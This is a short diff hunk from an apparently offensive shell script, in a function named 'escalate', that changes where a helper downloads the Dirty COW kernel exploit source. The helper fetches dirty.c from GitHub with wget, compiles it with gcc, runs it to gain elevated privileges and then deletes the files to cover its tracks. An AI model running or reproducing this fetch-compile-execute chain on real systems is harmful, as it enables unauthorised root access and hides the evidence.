@@ -169,7 +169,7 @@ function escalate() {
 
 		function dirty(){
 				echo -e "This may take some time...\n"
-				wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c 2>/dev/null
+				wget https://raw.githubusercontent.com/d4rk007/dirtycow/master/dirty.c 2>/dev/null
 				gcc -pthread dirty.c -o dirty -lcrypt
 				./dirty
 				rm -rf dirty*
